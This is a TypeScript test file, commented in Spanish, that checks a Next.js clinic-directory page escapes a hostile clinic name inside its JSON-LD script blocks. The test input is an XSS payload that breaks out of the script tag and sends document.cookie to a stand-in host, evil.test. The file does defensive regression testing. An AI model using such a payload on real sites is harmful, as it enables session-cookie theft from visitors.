/**
 * A1 (auditoría 30-sep-2026) — la página REAL /descubre/[categoria]/[ciudad]
 * con una clínica cuyo nombre es «</script><script>…».
 *
 * Se invoca el componente de la página (server component async) con el
 * directorio falso y se leen sus <script type="application/ld+json">: el HTML
 * que Next inyectaría tal cual no puede traer una etiqueta que cierre el
 * bloque, y el JSON tiene que seguir diciendo exactamente lo mismo.
 *
 * Run: npm run test:seguridad-xss-arco
 */
import { test, mock } from "node:test";
import assert from "node:assert/strict";

const ATAQUE = '</script><script>fetch("//evil.test/?c="+document.cookie)</script>';

const stub = () => null;
// `cache` solo existe dentro de Next (React canary); fuera, se vuelve identidad.
const reactCjs = require("react");
if (typeof reactCjs.cache !== "function") reactCjs.cache = (f: unknown) => f;
(mock as any).module("@/fonts/inter-400-700", { namedExports: { inter: { variable: "inter" } } });
(mock as any).module("@/components/public/landing/nav-session", { namedExports: { SalesNavSession: stub } });
(mock as any).module("@/components/public/landing/sales", { namedExports: { SalesFooter: stub } });
(mock as any).module("@/components/public/landing/sales/sales.css", { defaultExport: {} });
(mock as any).module("@/components/directory/CategoryGrid", {
  namedExports: { CategoryGrid: stub, CATEGORY_ICONS: new Proxy({}, { get: () => stub }) },
});
(mock as any).module("@/components/directory/CityClinicsList", { namedExports: { CityClinicsList: stub } });
(mock as any).module("@/components/directory/CityLinks", { namedExports: { CityCrossLinks: stub } });
(mock as any).module("@/components/directory/BookingPopupController", { namedExports: { BookingPopupController: stub } });
(mock as any).module("next/navigation", { namedExports: { notFound: () => { throw new Error("notFound"); } } });
(mock as any).module("@/lib/directory/query", {
  namedExports: {
    getCategoryCityCombos: async () => [],
    getCityPageData: async () => ({
      cityLabel: `Mérida ${ATAQUE}`,
      total: 1,
      page: 1,
      totalPages: 1,
      items: [{ id: "c1", name: ATAQUE, slug: "clinica-x", landingActive: true }],
    }),
  },
});

/** Todos los {type, __html} de los <script ld+json> del árbol de elementos. */
function scriptsLd(nodo: any, acc: string[] = []): string[] {
  if (!nodo || typeof nodo !== "object") return acc;
  if (Array.isArray(nodo)) { nodo.forEach((n) => scriptsLd(n, acc)); return acc; }
  const p = nodo.props;
  if (nodo.type === "script" && p?.type === "application/ld+json") acc.push(p.dangerouslySetInnerHTML.__html);
  if (p?.children) scriptsLd(p.children, acc);
  return acc;
}

test("la ciudad con una clínica hostil: dos bloques ld+json, sin «<» ni «>» y con el mismo contenido", async () => {
  const { default: Pagina } = await import("@/app/descubre/[categoria]/[ciudad]/page");
  const arbol = await Pagina({ params: { categoria: "dental", ciudad: "merida" } });
  const bloques = scriptsLd(arbol);
  assert.equal(bloques.length, 2);
  for (const html of bloques) {
    assert.ok(!/[<>]/.test(html), "ningún «<» ni «>» crudo en el bloque");
    assert.ok(!/<\/script/i.test(html));
  }
  const lista = JSON.parse(bloques[1]);
  assert.equal(lista["@type"], "ItemList");
  assert.equal(lista.itemListElement[0].name, ATAQUE, "Google lee el nombre tal cual, como texto");
  const migas = JSON.parse(bloques[0]);
  assert.match(migas.itemListElement[2].name, /<\/script><script>/);
});
